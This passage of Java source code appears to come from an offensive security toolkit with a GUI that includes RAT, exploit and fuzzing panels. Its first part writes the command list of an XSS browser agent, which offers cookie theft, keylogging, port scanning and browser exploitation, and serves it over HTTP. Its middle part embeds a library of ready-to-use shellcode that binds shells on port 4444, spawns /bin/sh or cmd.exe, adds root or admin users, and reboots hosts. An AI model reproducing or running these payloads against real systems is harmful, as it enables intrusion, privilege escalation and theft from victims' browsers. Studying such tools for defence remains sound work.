                                    outputCode.write("// redirectSite(url) - Redirect the user to the desired URL" + "\n");
                                    outputCode.write("// execJS(code) - Execute your JS on inside a script tag" + "\n");
                                    outputCode.write("// monster() - Call the Cookie monster on the user's browser" + "\n");
                                    outputCode.write("// tabKiller() - Kill the current tab ( Firefox, Chrome )" + "\n");
                                    outputCode.write("// PersistOnClick() - Persist the agent on an OnClick event" + "\n");
                                    outputCode.write("// jokeImages() - Make spin the images of the open pages" + "\n");
                                    outputCode.write("// protectMySite() - Activate the keylogging function and block XSS and SQLi attempts" + "\n");
                                    outputCode.write("// xssProtect() - Activate the XSS client-side protection on the desired browser " + "\n");
                                    outputCode.write("// sqlProtect() - Activate the SQLi client-side protection on the desired browser " + "\n");
                                    outputCode.write("// banIP(ip) - Add the desired IP/Hostname to your blacklist " + "\n");
                                    outputCode.write("// addIPtoBanList() - Add the current IP/Hostname to your blacklist " + "\n");
                                    outputCode.write("// antiCopyPaste() - Prevent the remote user of copy/paste the page " + "\n");
                                    outputCode.write("// noCTRL() - Deactivate the CTRL functions " + "\n");
                                    outputCode.write("// scanEngine(host) - Launch a discover scan from the remote browser " + "\n");
                                    outputCode.write("// portScanner(host) - Launch a portscan from the remote browser to a specific host " + "\n");
                                    outputCode.write("// launchWindow(id) - Create a new windows with the specified height, width " + "\n");
                                    outputCode.write("// exploitThis(exploitName) - Execute an exploit ( Browser ) from the agent " + "\n");
                                    outputCode.write("// scanForThreats() - Discover remote plugins and useful information for testing " + "\n");
                                    outputCode.write("// Plugins() - Obtains a list of running plugins on the remote host " + "\n");
                                    outputCode.write("// ScreenSize() - Calculate and retrieve current Window size " + "\n");
                                    outputCode.write("// ------------------------------" + "\n");
                                    outputCode.write("// Your commands or code goes here: \n// Example: alert(1);" + "\n");
                                    outputCode.write("// ------------------------------------------------------------" + "\n");
                                    outputCode.close();
                                }

                                String content = new String(Files.readAllBytes(Paths.get("exploits/code/" + xssAgent.getHost() + "-" + xssAgent.getId() + ".js")));
                                t.sendResponseHeaders(200, content.length());
                                try (OutputStream os = t.getResponseBody()) {
                                    os.write(content.getBytes());
                                }
                            }
                        }
                        // todo copy this and serve an example file on 8080 or so and allow to choose the port
                        HttpServer server = HttpServer.create(new InetSocketAddress(8000), 0);
                        server.setExecutor(null);
                        server.start();
                        server.createContext("/agent", new MyHandler());

                    } catch (IOException ex) {
                        Logger.getLogger(MainFrame.class.getName()).log(Level.SEVERE, null, ex);
                    } catch (Exception ex) {
                        Logger.getLogger(MainFrame.class.getName()).log(Level.SEVERE, null, ex);
                    }
                }
            };

            xssServer.start();

            // Add shellcodes
            jTextAreaShellcodeList.append(
                    "\n\nWindows XP/7/8 - Adds user 'x' with password 'y'\n shell = \"\\x31\\xc9\\x83\\xe9\\xce\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x81\\x73\\x13\\xe8\\x5e\\x22\\xde\\x83\\xeb\\xfc\\xe2\\xf4\\x14\\xb6\\x66\\xde\\xe8\\x5e\\xa9\\x9b\\xd4\\xd5\\x5e\\xdb\\x90\\x5f\\xcd\\x55\\xa7\\x46\\xa9\\x81\\xc8\\x5f\\xc9\\x97\\x63\\x6a\\xa9\\xdf\\x06\\x6f\\xe2\\x47\\x44\\xda\\xe2\\xaa\\xef\\x9f\\xe8\\xd3\\xe9\\x9c\\xc9\\x2a\\xd3\\x0a\\x06\\xda\\x9d\\xbb\\xa9\\x81\\xcc\\x5f\\xc9\\xb8\\x63\\x52\\x69\\x55\\xb7\\x42\\x23\\x35\\x63\\x42\\xa9\\xdf\\x03\\xd7\\x7e\\xfa\\xec\\x9d\\x13\\x1e\\x8c\\xd5\\x62\\xee\\x6d\\x9e\\x5a\\xd2\\x63\\x1e\\x2e\\x55\\x98\\x42\\x8f\\x55\\x80\\x56\\xc9\\xd7\\x63\\xde\\x92\\xde\\xe8\\x5e\\xa9\\xb6\\xd4\\x01\\x13\\x28\\x88\\x08\\xab\\x26\\x6b\\x9e\\x59\\x8e\\x80\\xae\\xa8\\xda\\xb7\\x36\\xba\\x20\\x62\\x50\\x75\\x21\\x0f\\x3d\\x4f\\xba\\xc6\\x3b\\x5a\\xbb\\xc8\\x71\\x41\\xfe\\x86\\x3b\\x56\\xfe\\x9d\\x2d\\x47\\xac\\xc8\\x27\\x02\\xa6\\xc8\\x71\\x63\\x9a\\xac\\x7e\\x04\\xf8\\xc8\\x30\\x47\\xaa\\xc8\\x32\\x4d\\xbd\\x89\\x32\\x45\\xac\\x87\\x2b\\x52\\xfe\\xa9\\x3a\\x4f\\xb7\\x86\\x37\\x51\\xaa\\x9a\\x3f\\x56\\xb1\\x9a\\x2d\\x02\\xa7\\xc8\\x71\\x63\\x9a\\xac\\x5e\\x22\\xde\"\n\n");
            jTextAreaShellcodeList.append(
                    "Binds a shell terminal at port 4444\n shell = \"\\x33\\xc9\\x83\\xe9\\xb8\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x81\\x73\\x13\\x7a\\xba\\xcb\\x13\\x83\\xeb\\xfc\\xe2\\xf4\\x86\\xd0\\x20\\x5e\\x92\\x43\\x34\\xec\\x85\\xda\\x40\\x7f\\x5e\\x9e\\x40\\x56\\x46\\x31\\xb7\\x16\\x02\\xbb\\x24\\x98\\x35\\xa2\\x40\\x4c\\x5a\\xbb\\x20\\x5a\\xf1\\x8e\\x40\\x12\\x94\\x8b\\x0b\\x8a\\xd6\\x3e\\x0b\\x67\\x7d\\x7b\\x01\\x1e\\x7b\\x78\\x20\\xe7\\x41\\xee\\xef\\x3b\\x0f\\x5f\\x40\\x4c\\x5e\\xbb\\x20\\x75\\xf1\\xb6\\x80\\x98\\x25\\xa6\\xca\\xf8\\x79\\x96\\x40\\x9a\\x16\\x9e\\xd7\\x72\\xb9\\x8b\\x10\\x77\\xf1\\xf9\\xfb\\x98\\x3a\\xb6\\x40\\x63\\x66\\x17\\x40\\x53\\x72\\xe4\\xa3\\x9d\\x34\\xb4\\x27\\x43\\x85\\x6c\\xad\\x40\\x1c\\xd2\\xf8\\x21\\x12\\xcd\\xb8\\x21\\x25\\xee\\x34\\xc3\\x12\\x71\\x26\\xef\\x41\\xea\\x34\\xc5\\x25\\x33\\x2e\\x75\\xfb\\x57\\xc3\\x11\\x2f\\xd0\\xc9\\xec\\xaa\\xd2\\x12\\x1a\\x8f\\x17\\x9c\\xec\\xac\\xe9\\x98\\x40\\x29\\xf9\\x98\\x50\\x29\\x45\\x1b\\x7b\\x7a\\xba\\xcb\\x13\\x1c\\xd2\\xda\\x4f\\x1c\\xe9\\x42\\xf2\\xef\\xd2\\x27\\xea\\xd0\\xda\\x9c\\xec\\xac\\xd0\\xdb\\x42\\x2f\\x45\\x1b\\x75\\x10\\xde\\xad\\x7b\\x19\\xd7\\xa1\\x43\\x23\\x93\\x07\\x9a\\x9d\\xd0\\x8f\\x9a\\x98\\x8b\\x0b\\xe0\\xd0\\x2f\\x42\\xee\\x84\\xf8\\xe6\\xed\\x38\\x96\\x46\\x69\\x42\\x11\\x60\\xb8\\x12\\xc8\\x35\\xa0\\x6c\\x45\\xbe\\x3b\\x85\\x6c\\x90\\x44\\x28\\xeb\\x9a\\x42\\x10\\xbb\\x9a\\x42\\x2f\\xeb\\x34\\xc3\\x12\\x17\\x12\\x16\\xb4\\xe9\\x34\\xc5\\x10\\x45\\x34\\x24\\x85\\x6a\\xa3\\xf4\\x03\\x7c\\xb2\\xec\\x0f\\xbe\\x34\\xc5\\x85\\xcd\\x37\\xec\\xaa\\xd2\\x3b\\x99\\x7e\\xe5\\x98\\xec\\xac\\x45\\x1b\\x13\"\n\n");
            jTextAreaShellcodeList.append(
                    "Runs cmd.exe and ExitThread\n shell = \"\\x31\\xc9\\x83\\xe9\\xdd\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x81\\x73\\x13\\xa8\\x2a\\x6e\\x63\\x83\\xeb\\xfc\\xe2\\xf4\\x54\\xc2\\x2a\\x63\\xa8\\x2a\\xe5\\x26\\x94\\xa1\\x12\\x66\\xd0\\x2b\\x81\\xe8\\xe7\\x32\\xe5\\x3c\\x88\\x2b\\x85\\x2a\\x23\\x1e\\xe5\\x62\\x46\\x1b\\xae\\xfa\\x04\\xae\\xae\\x17\\xaf\\xeb\\xa4\\x6e\\xa9\\xe8\\x85\\x97\\x93\\x7e\\x4a\\x67\\xdd\\xcf\\xe5\\x3c\\x8c\\x2b\\x85\\x05\\x23\\x26\\x25\\xe8\\xf7\\x36\\x6f\\x88\\x23\\x36\\xe5\\x62\\x43\\xa3\\x32\\x47\\xac\\xe9\\x5f\\xa3\\xcc\\xa1\\x2e\\x53\\x2d\\xea\\x16\\x6f\\x23\\x6a\\x62\\xe8\\xd8\\x36\\xc3\\xe8\\xc0\\x22\\x85\\x6a\\x23\\xaa\\xde\\x63\\xa8\\x2a\\xe5\\x0b\\x94\\x75\\x5f\\x95\\xc8\\x7c\\xe7\\x9b\\x2b\\xea\\x15\\x33\\xc0\\xc5\\xa0\\x83\\xc8\\x42\\xf6\\x9d\\x22\\x24\\x39\\x9c\\x4f\\x49\\x03\\x07\\x86\\x4f\\x16\\x06\\xa8\\x2a\\x6e\\x63\"\n\n");
            jTextAreaShellcodeList.append(
                    "EggHunter for Windows Platforms\n EggHunter = \"\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\x6a\\x02\\x58\\xcd\\x2e\\x3c\\x05\\x5a\\x74\\xef\\xb8\\\" # Egg Hunter\n");
            jTextAreaShellcodeList.append(
                    " EggHunter += \"\\x54\\x30\\x30\\x57\\\" # Egg - W00T\n");
            jTextAreaShellcodeList.append(
                    " EggHunter += \"\\x8b\\xfa\\xaf\\x75\\xea\\xaf\\x75\\xe7\\xff\\xe7\\\" # Egg\n\n");
            jTextAreaShellcodeList.append(
                    "As a proof of concept shows a MessageBox\n shell = \"\\xeb\\x10\\x58\\x31\\xc9\\x66\\x81\\xe9\\x22\\xff\\x80\\x30\\x1d\\x40\\xe2\\xfa\\xeb\\x05\\xe8\\xeb\\xff\\xff\\xff\\xf4\\xd1\\x1d\\x1d\\x1d\\x42\\xf5\\x4b\\x1d\\x1d\\x1d\\x94\\xde\\x4d\\x75\\x93\\x53\\x13\\xf1\\xf5\\x7d\\x1d\\x1d\\x1d\\x2c\\xd4\\x7b\\xa4\\x72\\x73\\x4c\\x75\\x68\\x6f\\x71\\x70\\x49\\xe2\\xcd\\x4d\\x75\\x2b\\x07\\x32\\x6d\\xf5\\x5b\\x1d\\x1d\\x1d\\x2c\\xd4\\x4c\\x4c\\x90\\x2a\\x4b\\x90\\x6a\\x15\\x4b\\x4c\\xe2\\xcd\\x4e\\x75\\x85\\xe3\\x97\\x13\\xf5\\x30\\x1d\\x1d\\x1d\\x4c\\x4a\\xe2\\xcd\\x2c\\xd4\\x54\\xff\\xe3\\x4e\\x75\\x63\\xc5\\xff\\x6e\\xf5\\x04\\x1d\\x1d\\x1d\\xe2\\xcd\\x48\\x4b\\x79\\xbc\\x2d\\x1d\\x1d\\x1d\\x96\\x5d\\x11\\x96\\x6d\\x01\\xb0\\x96\\x75\\x15\\x94\\xf5\\x43\\x40\\xde\\x4e\\x48\\x4b\\x4a\\x96\\x71\\x39\\x05\\x96\\x58\\x21\\x96\\x49\\x18\\x65\\x1c\\xf7\\x96\\x57\\x05\\x96\\x47\\x3d\\x1c\\xf6\\xfe\\x28\\x54\\x96\\x29\\x96\\x1c\\xf3\\x2c\\xe2\\xe1\\x2c\\xdd\\xb1\\x25\\xfd\\x69\\x1a\\xdc\\xd2\\x10\\x1c\\xda\\xf6\\xef\\x26\\x61\\x39\\x09\\x68\\xfc\\x96\\x47\\x39\\x1c\\xf6\\x7b\\x96\\x11\\x56\\x96\\x47\\x01\\x1c\\xf6\\x96\\x19\\x96\\x1c\\xf5\\xf4\\x1f\\x1d\\x1d\\x1d\\x2c\\xdd\\x94\\xf7\\x42\\x43\\x40\\x46\\xde\\xf5\\x32\\xe2\\xe2\\xe2\\x70\\x75\\x75\\x33\\x78\\x65\\x78\\x1d\"\n\n");
            jTextAreaShellcodeList.append(
                    "Execute x86.linux.bind and bind port 4444\n shell = \"\\x33\\xc9\\x83\\xe9\\xeb\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x81\\x73\\x13\\x81\\x9c\\x95\\xe9\\x83\\xeb\\xfc\\xe2\\xf4\\xb0\\x47\\xc6\\xaa\\xd2\\xf6\\x97\\x83\\xe7\\xc4\\x0c\\x60\\x60\\x51\\x15\\x7f\\xc2\\xce\\xf3\\x81\\x90\\xc0\\xf3\\xba\\x08\\x7d\\xff\\x8f\\xd9\\xcc\\xc4\\xbf\\x08\\x7d\\x58\\x69\\x31\\xfa\\x44\\x0a\\x4c\\x1c\\xc7\\xbb\\xd7\\xdf\\x1c\\x08\\x31\\xfa\\x58\\x69\\x12\\xf6\\x97\\xb0\\x31\\xa3\\x58\\x69\\xc8\\xe5\\x6c\\x59\\x8a\\xce\\xfd\\xc6\\xae\\xef\\xfd\\x81\\xae\\xfe\\xfc\\x87\\x08\\x7f\\xc7\\xba\\x08\\x7d\\x58\\x69\\x00\"\n");
            jTextAreaShellcodeList.append(
                    "Adds user 'x' with password 'y'\n shell = \"\\x31\\xc9\\x89\\xcb\\x6a\\x46\\x58\\xcd\\x80\\x6a\\x05\\x58\\x31\\xc9\\x51\\x68\\x73\\x73\\x77\\x64\\x68\\x2f\\x2f\\x70\\x61\\x68\\x2f\\x65\\x74\\x63\\x89\\xe3\\x41\\xb5\\x04\\xcd\\x80\\x93\\xe8\\x1f\\x00\\x00\\x00\\x78\\x3a\\x41\\x7a\\x37\\x44\\x71\\x55\\x7a\\x47\\x6a\\x77\\x69\\x4d\\x77\\x3a\\x30\\x3a\\x30\\x3a\\x3a\\x2f\\x3a\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x0a\\x59\\x8b\\x51\\xfc\\x6a\\x04\\x58\\xcd\\x80\\x6a\\x01\\x58\\xcd\\x80\"\n\n");
            jTextAreaShellcodeList.append(
                    "Execute x86.linux.binsh\n shell = \"\\x31\\xc0\\x50\\x68\\x30\\x30\\x84\\x79\\x68\\x30\\x73\\x7a\\x7f\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80\"\n\n");
            jTextAreaShellcodeList.append(
                    "Binds a shell at port 4444\n shell = \"\\x31\\xc9\\x83\\xe9\\xec\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x81\\x73\\x13\\xce\\xd3\\x61\\x53\\x83\\xeb\\xfc\\xe2\\xf4\\xa4\\xb2\\x39\\xca\\x9c\\xbb\\x71\\x51\\xdf\\x8f\\xe8\\xb2\\x9c\\x91\\x33\\x11\\x9c\\xb9\\x71\\x9e\\x4e\\x4a\\xf2\\x02\\x9d\\x81\\x0b\\x3b\\x96\\x1e\\xe1\\xe3\\xa4\\x1e\\xe1\\x01\\x9d\\x81\\xd1\\x4d\\x03\\x53\\xf6\\x39\\xcc\\x8a\\x0b\\x09\\x96\\x82\\x36\\x02\\x03\\x53\\x28\\x2a\\x3b\\x83\\x09\\x7c\\xe1\\xa0\\x09\\x3b\\xe1\\xb1\\x08\\x3d\\x47\\x30\\x31\\x07\\x9d\\x80\\xd1\\x68\\x03\\x53\\x61\\x53\"\n\n");
            jTextAreaShellcodeList.append(
                    "Setuid(0) and runs /bin/sh\n shell = \"\\x31\\xc0\\x50\\x50\\xb0\\x17\\xcd\\x80\\x31\\xc0\\x50\\x68\\x30\\x30\\x84\\x79\\x79\\x30\\x73\\x7a\\x7f\\x89\\xe3\\x50\\x54\\x53\\x50\\xb0\\x3b\\xcd\\x80\"\n\n");
            jTextAreaShellcodeList.append(
                    "Binds a shell at port 4444\n shell = \"\\x38\\x60\\x00\\x02\\x38\\x80\\x00\\x01\\x38\\xa0\\x00\\x06\\x38\\x00\\x00\\x61\\x44\\x00\\x00\\x02\\x7c\\x00\\x02\\x78\\x7c\\x7e\\x1b\\x78\\x48\\x00\\x00\\x0d\\x00\\x02\\x11\\x5c\\x00\\x00\\x00\\x00\\x7c\\x88\\x02\\xa6\\x38\\xa0\\x00\\x10\\x38\\x00\\x00\\x68\\x7f\\xc3\\xf3\\x78\\x44\\x00\\x00\\x02\\x7c\\x00\\x02\\x78\\x38\\x00\\x00\\x6a\\x7f\\xc3\\xf3\\x78\\x44\\x00\\x00\\x02\\x7c\\x00\\x02\\x78\\x7f\\xc3\\xf3\\x78\\x38\\x00\\x00\\x1e\\x38\\x80\\x00\\x10\\x90\\x81\\xff\\xe8\\x38\\xa1\\xff\\xe8\\x38\\x81\\xff\\xf0\\x44\\x00\\x00\\x02\\x7c\\x00\\x02\\x78\\x7c\\x7e\\x1b\\x78\\x38\\xa0\\x00\\x02\\x38\\x00\\x00\\x5a\\x7f\\xc3\\xf3\\x78\\x7c\\xa4\\x2b\\x78\\x44\\x00\\x00\\x02\\x7c\\x00\\x02\\x78\\x38\\xa5\\xff\\xff\\x2c\\x05\\xff\\xff\\x40\\x82\\xff\\xe5\\x38\\x00\\x00\\x42\\x44\\x00\\x00\\x02\\x7c\\x00\\x02\\x78\\x7c\\xa5\\x2a\\x79\\x40\\x82\\xff\\xfd\\x7c\\x68\\x02\\xa6\\x38\\x63\\x00\\x28\\x90\\x61\\xff\\xf8\\x90\\xa1\\xff\\xfc\\x38\\x81\\xff\\xf8\\x38\\x00\\x00\\x3b\\x7c\\x00\\x04\\xac\\x44\\x00\\x00\\x02\\x7c\\x00\\x02\\x78\\x7f\\xe0\\x00\\x08\\x2f\\x62\\x69\\x6e\\x2f\\x63\\x73\\x68\\x00\\x00\\x00\\x00\"\n\n");
            jTextAreaShellcodeList.append(
                    "Adds a root user named 'r00t' with no pass\n shell = \"\\x7c\\xa5\\x2a\\x79\\x40\\x82\\xff\\xfd\\x7d\\x48\\x02\\xa6\\x3b\\xea\\x01\\x70\\x39\\x60\\x01\\x70\\x39\\x1f\\xff\\x0d\\x7c\\xa8\\x29\\xae\\x38\\x7f\\xff\\x04\\x38\\x80\\x02\\x01\\x38\\xa0\\xff\\xff\\x38\\x0b\\xfe\\x95\\x44\\xff\\xff\\x02\\x60\\x60\\x60\\x60\\x38\\x9f\\xff\\x0e\\x38\\xab\\xfe\\xe5\\x38\\x0b\\xfe\\x94\\x44\\xff\\xff\\x02\\x60\\x60\\x60\\x60\\x38\\x0b\\xfe\\x96\\x44\\xff\\xff\\x02\\x60\\x60\\x60\\x60\\x7c\\xa5\\x2a\\x79\\x38\\x7f\\xff\\x04\\x90\\x61\\xff\\xf8\\x90\\xa1\\xff\\xfc\\x38\\x81\\xff\\xf8\\x38\\x0b\\xfe\\xcb\\x44\\xff\\xff\\x02\\x60\\x60\\x60\\x60\\x38\\x0b\\xfe\\x91\\x44\\xff\\xff\\x02\\x2f\\x74\\x6d\\x70\\x2f\\x78\\x2e\\x73\\x68\\x58\\x23\\x21\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x0a\\x2f\\x62\\x69\\x6e\\x2f\\x65\\x63\\x68\\x6f\\x20\\x27\\x72\\x30\\x30\\x74\\x3a\\x3a\\x39\\x39\\x39\\x3a\\x38\\x30\\x3a\\x3a\\x30\\x3a\\x30\\x3a\\x72\\x30\\x30\\x74\\x3a\\x2f\\x3a\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x27\\x20\\x7c\\x20\\x2f\\x75\\x73\\x72\\x2f\\x62\\x69\\x6e\\x2f\\x6e\\x69\\x6c\\x6f\\x61\\x64\\x20\\x2d\\x6d\\x20\\x70\\x61\\x73\\x73\\x77\\x64\\x20\\x2e\\x0a\"\n\n");
            jTextAreaShellcodeList.append(
                    "Executes /bin/sh\n shell = \"\\x7c\\xa5\\x2a\\x79\\x40\\x82\\xff\\xfd\\x7d\\x68\\x02\\xa6\\x3b\\xeb\\x01\\x70\\x39\\x40\\x01\\x70\\x39\\x1f\\xfe\\xcf\\x7c\\xa8\\x29\\xae\\x38\\x7f\\xfe\\xc8\\x90\\x61\\xff\\xf8\\x90\\xa1\\xff\\xfc\\x38\\x81\\xff\\xf8\\x38\\x0a\\xfe\\xcb\\x44\\xff\\xff\\x02\\x7c\\xa3\\x2b\\x78\\x38\\x0a\\xfe\\x91\\x44\\xff\\xff\\x02\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x58\"\n\n");
            jTextAreaShellcodeList.append(
                    "Reboots the remote box\n shell = \"\\x7c\\x63\\x1a\\x79\\x39\\x40\\x01\\x70\\x38\\x0a\\xfe\\xb4\\x44\\xff\\xff\\x02\\x60\\x60\\x60\\x60\\x38\\x0a\\xfe\\xc7\\x44\\xff\\xff\\x02\"\n");
            jTextAreaShellcodeList.setCaretPosition(
                    0);

            jTreeExploits.setSelectionRow(
                    1);
        } catch (IOException ex) {
            Logger.getLogger(MainFrame.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jMenuItem49 = new javax.swing.JMenuItem();
        jSeparator9 = new javax.swing.JSeparator();
        jSeparator38 = new javax.swing.JSeparator();
        jPopupMenu1 = new javax.swing.JPopupMenu();
        jPanel1 = new javax.swing.JPanel();
        jScrollPane9 = new javax.swing.JScrollPane();
        jTreeRAT = new javax.swing.JTree();
        jLabel11 = new javax.swing.JLabel();
        jPanel2 = new javax.swing.JPanel();
        jLabel15 = new javax.swing.JLabel();
        jTextFieldSearch = new javax.swing.JTextField();
        jButtonSearch = new javax.swing.JButton();
        jLabel22 = new javax.swing.JLabel();
        jComboBox1 = new javax.swing.JComboBox();
        jPanel15 = new javax.swing.JPanel();
        jTabbedPane2 = new javax.swing.JTabbedPane();
        jScrollPane1 = new javax.swing.JScrollPane();
        jTreeExploits = new javax.swing.JTree();
        jScrollPane8 = new javax.swing.JScrollPane();
        jTreeTools = new javax.swing.JTree();
        jScrollPane18 = new javax.swing.JScrollPane();
        jTreeNotepad = new javax.swing.JTree();
        jToolBar1 = new javax.swing.JToolBar();
        jSeparator47 = new javax.swing.JToolBar.Separator();
        jButton4 = new javax.swing.JButton();
        jSeparator1 = new javax.swing.JToolBar.Separator();
        jButton3 = new javax.swing.JButton();
        jSeparator3 = new javax.swing.JToolBar.Separator();
        jButton6 = new javax.swing.JButton();
        jSeparator5 = new javax.swing.JToolBar.Separator();
        jButton7 = new javax.swing.JButton();
        jSeparator6 = new javax.swing.JToolBar.Separator();
        jButton8 = new javax.swing.JButton();
        jSeparator7 = new javax.swing.JToolBar.Separator();
        jButton9 = new javax.swing.JButton();
        jLabelInterface = new javax.swing.JLabel();
        jSeparator8 = new javax.swing.JToolBar.Separator();
        jButton10 = new javax.swing.JButton();
        jSeparator4 = new javax.swing.JToolBar.Separator();
        jButton12 = new javax.swing.JButton();
        jSeparator2 = new javax.swing.JToolBar.Separator();
        jButton21 = new javax.swing.JButton();
        jSeparator12 = new javax.swing.JToolBar.Separator();
        jButton13 = new javax.swing.JButton();
        jSeparator10 = new javax.swing.JToolBar.Separator();
        jButton14 = new javax.swing.JButton();
        jSeparator30 = new javax.swing.JToolBar.Separator();
        jButton25 = new javax.swing.JButton();
        jSeparator42 = new javax.swing.JToolBar.Separator();
        jButton26 = new javax.swing.JButton();
        jSeparator11 = new javax.swing.JToolBar.Separator();
        jButton5 = new javax.swing.JButton();
        jTabbedPane = new javax.swing.JTabbedPane();
        jPanelDashboard = new javax.swing.JPanel();
        jPanel3 = new javax.swing.JPanel();
        jLabel1 = new javax.swing.JLabel();
        jLabel2 = new javax.swing.JLabel();
        jLabel3 = new javax.swing.JLabel();
        jLabel4 = new javax.swing.JLabel();
        jTextFieldProjectN = new javax.swing.JTextField();
        jTextFieldTargetH = new javax.swing.JTextField();
        jTextFieldTargetP = new javax.swing.JTextField();
        jTextFieldTargetPath = new javax.swing.JTextField();
        jLabel5 = new javax.swing.JLabel();
        jLabel6 = new javax.swing.JLabel();
        jTextFieldExtraOptions = new javax.swing.JTextField();
        jTextFieldshellPort = new javax.swing.JTextField();
        jLabel7 = new javax.swing.JLabel();
        jLabel8 = new javax.swing.JLabel();
        jComboBoxShellcode = new javax.swing.JComboBox();
        jTextFieldLocalHost = new javax.swing.JTextField();
        jPanel6 = new javax.swing.JPanel();
        jToolBar2 = new javax.swing.JToolBar();
        jButton16 = new javax.swing.JButton();
        jSeparator22 = new javax.swing.JToolBar.Separator();
        jButton27 = new javax.swing.JButton();
        jSeparator46 = new javax.swing.JToolBar.Separator();
        jButton17 = new javax.swing.JButton();
        jSeparator23 = new javax.swing.JToolBar.Separator();
        jButton20 = new javax.swing.JButton();
        jSeparator24 = new javax.swing.JToolBar.Separator();
        jButton19 = new javax.swing.JButton();
        jSeparator25 = new javax.swing.JToolBar.Separator();
        jButton18 = new javax.swing.JButton();
        jPanelEditor = new javax.swing.JPanel();
        jPanel18 = new javax.swing.JPanel();
        jButtonShell = new javax.swing.JButton();
        jTextFieldShellinput = new javax.swing.JTextField();
        jScrollPane2 = new javax.swing.JScrollPane();
        jTextAreaShellcode = new javax.swing.JTextArea();
        jButtonShell1 = new javax.swing.JButton();
        jPanel16 = new javax.swing.JPanel();
        jPanel24 = new javax.swing.JPanel();
        jToolBar3 = new javax.swing.JToolBar();
        jLabel29 = new javax.swing.JLabel();
        jLabelTargetName = new javax.swing.JLabel();
        jSeparator41 = new javax.swing.JToolBar.Separator();
        jLabel33 = new javax.swing.JLabel();
        jLabelPlatform = new javax.swing.JLabel();
        jSeparator39 = new javax.swing.JToolBar.Separator();
        jCheckBox2 = new javax.swing.JCheckBox();
        jSeparator45 = new javax.swing.JToolBar.Separator();
        jButton24 = new javax.swing.JButton();
        jSeparator37 = new javax.swing.JToolBar.Separator();
        jButton22 = new javax.swing.JButton();
        jSeparator44 = new javax.swing.JToolBar.Separator();
        jButton23 = new javax.swing.JButton();
        jSeparator40 = new javax.swing.JToolBar.Separator();
        jButton15 = new javax.swing.JButton();
        jSeparator43 = new javax.swing.JToolBar.Separator();
        jPanelTargets = new javax.swing.JPanel();
        jPanel7 = new javax.swing.JPanel();
        jPanel9 = new javax.swing.JPanel();
        jPanel11 = new javax.swing.JPanel();
        jLabel9 = new javax.swing.JLabel();
        jTextFieldPentestName = new javax.swing.JTextField();
        jLabel16 = new javax.swing.JLabel();
        jTextFieldPentestSubTittle = new javax.swing.JTextField();
        jLabel17 = new javax.swing.JLabel();
        jTextFieldPentestImage = new javax.swing.JTextField();
        jButton11 = new javax.swing.JButton();
        jPanel17 = new javax.swing.JPanel();
        jScrollPane6 = new javax.swing.JScrollPane();
        jTextAreaPentestFooter = new javax.swing.JTextArea();
        jPanel13 = new javax.swing.JPanel();
        jComboBoxCustom1 = new javax.swing.JComboBox();
        jLabel18 = new javax.swing.JLabel();
        jTextFieldCustom1 = new javax.swing.JTextField();
        jLabel19 = new javax.swing.JLabel();
        jLabel20 = new javax.swing.JLabel();
        jTextFieldCustomDesc1 = new javax.swing.JTextField();
        jPanel23 = new javax.swing.JPanel();
        jScrollPane17 = new javax.swing.JScrollPane();
        jTextAreaPentestHeader = new javax.swing.JTextArea();
        jButton2 = new javax.swing.JButton();
        jPanel25 = new javax.swing.JPanel();
        jComboBoxCustom2 = new javax.swing.JComboBox();
        jLabel24 = new javax.swing.JLabel();
        jTextFieldCustom2 = new javax.swing.JTextField();
        jLabel25 = new javax.swing.JLabel();
        jLabel26 = new javax.swing.JLabel();
        jTextFieldCustomDesc2 = new javax.swing.JTextField();
        jLabel21 = new javax.swing.JLabel();
        jPanel8 = new javax.swing.JPanel();
        jButton1 = new javax.swing.JButton();
        jScrollPane12 = new javax.swing.JScrollPane();
        jTextAreaSocketFuzz = new javax.swing.JTextArea();
        jLabel12 = new javax.swing.JLabel();
        jTextFieldSocketURL = new javax.swing.JTextField();
        jLabel13 = new javax.swing.JLabel();
        jTextFieldSocketData = new javax.swing.JTextField();
        jLabel14 = new javax.swing.JLabel();
        jTextFieldSocketPort = new javax.swing.JTextField();
        jCheckBoxSocketRandom = new javax.swing.JCheckBox();
        jPanel4 = new javax.swing.JPanel();
        jScrollPane7 = new javax.swing.JScrollPane();
        jTextAreaShellcodeList = new javax.swing.JTextArea();
        jPanel10 = new javax.swing.JPanel();
        jPanel12 = new javax.swing.JPanel();
        jLabel23 = new javax.swing.JLabel();
        jTabbedPane1 = new javax.swing.JTabbedPane();
        jPanel14 = new javax.swing.JPanel();
        jScrollPane3 = new javax.swing.JScrollPane();
        jTextAreaQuickInfo = new javax.swing.JTextArea();
        jPanel19 = new javax.swing.JPanel();
        jScrollPane10 = new javax.swing.JScrollPane();
        jTextAreaAppLog = new javax.swing.JTextArea();
        jPanel20 = new javax.swing.JPanel();
        jScrollPane11 = new javax.swing.JScrollPane();
        jTextAreaDebugging = new javax.swing.JTextArea();
        jPanel5 = new javax.swing.JPanel();
        jProgressBarModuleStatus = new javax.swing.JProgressBar();
        jLabel10 = new javax.swing.JLabel();
        jLabelWelcome = new javax.swing.JLabel();
        jPanel21 = new javax.swing.JPanel();
        jScrollPane4 = new javax.swing.JScrollPane();
        jTreeRemoteScanner = new javax.swing.JTree();
        jPanel22 = new javax.swing.JPanel();
        jScrollPane5 = new javax.swing.JScrollPane();
        jTreeModuleStatus = new javax.swing.JTree();
        jButtonExecution = new javax.swing.JButton();
        jMenuBar1 = new javax.swing.JMenuBar();
        jMenu1 = new javax.swing.JMenu();
        jMenuItem2 = new javax.swing.JMenuItem();
        jMenuItem3 = new javax.swing.JMenuItem();
